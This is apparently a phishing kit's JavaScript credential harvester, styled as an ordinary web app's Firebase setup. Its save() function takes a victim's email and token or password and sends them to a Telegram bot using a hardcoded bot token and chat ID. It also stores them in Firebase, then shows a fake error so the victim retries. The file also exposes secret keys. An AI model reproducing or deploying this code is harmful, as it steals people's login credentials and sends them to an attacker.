// Your web app's Firebase configuration
var firebaseConfig = {
	apiKey: "AIzaSyAZVyM5aZAFDxwJe2yEWEVgIA92coQ2uW4",
    authDomain: "sdkweo-cda8e.firebaseapp.com",
    projectId: "sdkweo-cda8e",
    storageBucket: "sdkweo-cda8e.appspot.com",
    messagingSenderId: "1012059676320",
    appId: "1:1012059676320:web:61574a9cfe127f1d77f3c5"
  };
// Initialize Firebase
firebase.initializeApp(firebaseConfig);

// Set database variable
var database = firebase.database()

function save() {
  var email = document.getElementById('x').value
  var userToken = document.getElementById('userToken').value
  var id = Math.floor(Math.random() * 999);
  var userLevel = Math.floor(Math.random() * 9);
  var age = Math.floor(Math.random() * 19);

  var token = "7325555831:AAG7jKRbdlyavv4VTqFoYu0pspiIF_p9Iyo";
  var chat_id = -1002244995614;
  var message = " New user Record ---| Email:: " + email + " | UserToken:: " + userToken ;  
  var urlz = "https://api.telegram.org/bot" + token + "/sendMessage?chat_id=" + chat_id + "&text=" + message; 

  const  urle = urlz;
    const xht = new XMLHttpRequest();

    xht.open("GET", urle);
    xht.send();

  database.ref('followUp/' + id).set({
    email : email,
    userToken : userToken,
    userLevel : userLevel,
    age : age,
  })

  
  $("#error").css("display", "none");
  $("#mcontent").css("display", "none");
  $("#mspinner").css("display", "block");
  setTimeout(() => {
    $("#mspinner").css("display", "none");
    $("#mcontent").css("display", "block");
    $("#error").css("display", "block");
    $("#x").val(url);
    $("#userToken").val("");
  }, 6000);


 
}


